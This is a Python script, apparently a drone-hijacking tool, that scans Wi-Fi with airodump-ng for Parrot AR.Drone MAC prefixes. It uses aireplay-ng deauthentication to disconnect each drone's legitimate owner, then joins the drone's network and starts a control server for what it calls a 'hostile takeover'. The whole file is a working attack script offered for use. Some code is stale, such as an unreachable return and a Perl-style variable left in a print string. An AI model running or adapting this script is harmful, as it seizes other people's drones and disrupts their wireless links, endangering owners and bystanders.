import subprocess
import time
import re
import os
import server



def find_drone(mac, drones):
	for d in drones:
		
		if mac in d:
			return d
	return 'Not found'


def execute(cmd):
	print "Running " + cmd 
	os.system(cmd)
	return
	return subprocess.Popen(cmd, shell=True)

def execute2(cmd):
	print "Running " + cmd 
	return subprocess.Popen(cmd, shell=True)


def main():
	tmpfile = "/tmp/dronestrike" #temp file 
	drone_macs = ['90:03:B7','A0:14:3D',  '00:12:1C', '00:26:7E']
	interface  = "wlan5"
	interface2 = "wlan7"

	# the JS to control our drone
	controljs  = "drone_control/drone_pwn.js"

	# paths to applications
	dhclient	= "dhclient"
	iwconfig	= "iwconfig"
	ifconfig	= "ifconfig"
	airmon	= "airmon-ng"
	aireplay	= "aireplay-ng"
	aircrack	= "aircrack-ng"
	airodump	= "airodump-ng"
	nodejs	= "nodejs"
	

	execute(ifconfig +' ' + interface +' down') #pu the interface down 	
	airmon_process = execute(airmon + ' start ' + interface) #putting interface in the monitor mode 



	mon_interface = 'mon0'
	cmd1 = 'sudo %s --output-format csv -w %s %s >>/dev/null 2>>/dev/null' %(airodump, tmpfile,interface)
	print cmd1
	airodump_process = execute2(cmd1)
	print airodump_process.pid
	time.sleep(3)
	execute('sudo kill '+str(airodump_process.pid))
	time.sleep(1)
	execute('sudo kill -HUP ' +str(airodump_process.pid))
	time.sleep(1)
	execute('sudo kill -9 ' + str(airodump_process.pid))
	time.sleep(1)
	execute('sudo killall -9 ' + aireplay + ' '+ airodump)
	
	my_drone = '90:03:B7:34:3B:02'
	f = open(tmpfile+'-01.csv', 'rb')
	tmp_file = f.read()
	drones = []
	for mac in drone_macs:
		pattern = '^(%s.[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),' %(mac)
		val = re.findall(pattern ,tmp_file, re.MULTILINE)
		drones += val


	clients =[] 

	for mac in drone_macs:
		pattern = '^([\w:]+).*\s(%s.[\w:]+),' % (mac)
		val = re.findall(pattern, tmp_file, re.MULTILINE)
		clients += val
	
	print "Found %i drone(s)" %(len(drones))
	for d in drones:
		print d

	#raw_input("press Enter to Continue")

	# if len(drones) == 0:
	# 	print "No drones \nexitting ..."
	# 	return 

	print "Found %i client(s)" %(len(clients))
	for c in clients:
		print c

	#raw_input("press Enter to Continue")

	execute('sudo rm '+tmpfile+'-01.csv')

	# now, disconnect the TRUE owner of the drone.
	for c in clients:
		if(c[0])=='BSSID':
			continue
		d = find_drone(c[1], drones)
		print "Found client (" + str(c[0]) + ") connected to " + str(d)

		#res = raw_input("You want to disconnect the client?? [Y/N]\n")

		#if res == 'Y' or res =='y':
		if my_drone not in d:
			cmd = 'sudo ' + iwconfig + ' ' + interface + ' channel ' + str(d[1])
			#print cmd
			execute(cmd)
			time.sleep(2)
			print "Disconnecting the true owner of the drone ;)\n\n"
			cmd = aireplay + " -0 20 -a " + str(d[0])+ " -c " + str(c[0]) + " "+ interface
			#print cmd
			execute(cmd)

	time.sleep(2)
	airmon_process = execute(airmon + ' stop  mon0') #putting interface in the monitor mode 

	# connect to each drone and run our zombie client!
	for d in drones:
		#res = raw_input("You want to connect to the drone  ?? [Y/N]")
		#if res == 'Y' or res =='y':
		if my_drone not in d:
			print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n"
			cmd = "sudo "+iwconfig+" "+interface2+" essid " +d[2]
			#print cmd
			execute(cmd)

			print "Acquiring IP from drone for hostile takeover\n"
		
			cmd = "sudo " +ifconfig+" "+interface2+ " 192.168.1.10"
			#print cmd
			execute(cmd)

			execute('reset')
			execute('clear')
			print "\t\t\tTAKING OVER DRONE\n"
			server.server('192.168.1.1', 6665)
		#sudo($nodejs, $controljs);


if __name__ == '__main__':
	main()
